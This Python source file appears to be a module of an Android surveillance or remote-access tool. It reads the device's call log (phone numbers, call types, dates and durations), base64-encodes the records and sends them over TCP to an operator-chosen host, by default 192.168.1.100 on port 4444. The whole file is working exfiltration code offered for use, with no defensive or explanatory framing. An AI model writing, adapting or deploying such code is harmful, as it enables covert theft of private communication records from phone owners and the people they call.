#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Author: @bobsecq
# Contributor(s):

from jnius import autoclass
import socket
import base64
import argparse

__all__ = ["get_call_details_and_send"]

def get_call_details():
    """Fetches call details from the Android call log."""
    calls = []
    Calls = autoclass('android.provider.CallLog$Calls')
    PythonActivity = autoclass('org.renpy.android.PythonService')
    cursor = PythonActivity.mService.getContentResolver().query(Calls.CONTENT_URI, None, None, None, Calls.DATE + " DESC")
    calls_count = cursor.getCount()
    if calls_count > 0:
        while cursor.moveToNext():
            ph_num = cursor.getString(cursor.getColumnIndex(Calls.NUMBER))
            call_type_code = cursor.getString(cursor.getColumnIndex(Calls.TYPE))
            call_date = cursor.getString(cursor.getColumnIndex(Calls.DATE))
            call_duration = cursor.getString(cursor.getColumnIndex(Calls.DURATION))
            calls.append({'phNum': ph_num, 'callTypeC': call_type_code, 'callDate': call_date, 'callDuration': call_duration})
    cursor.close()
    return calls

def send_call_details(calls, target_ip="192.168.1.100", target_port=4444):
    """Send the collected call details to a remote system via TCP."""
    encoded_calls = base64.b64encode(str(calls).encode('utf-8')).decode('utf-8')

    # Send the data via TCP
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((target_ip, target_port))
        s.sendall(encoded_calls.encode('utf-8'))
        print(f"[INFO] Call details sent to {target_ip}:{target_port}")

def parse_arguments():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(description="Fetch call details and send to the target system via TCP.")
    parser.add_argument("-ip", "--target-ip", type=str, required=True, help="Target IP address to send the call details to.")
    parser.add_argument("-p", "--port", type=int, required=True, help="Target port to send the call details to.")
    return parser.parse_args()

if __name__ == "__main__":
    # Parse arguments
    args = parse_arguments()

    # Get call details
    call_details = get_call_details()

    # Send the call details to the target system
    send_call_details(call_details, target_ip=args.target_ip, target_port=args.port)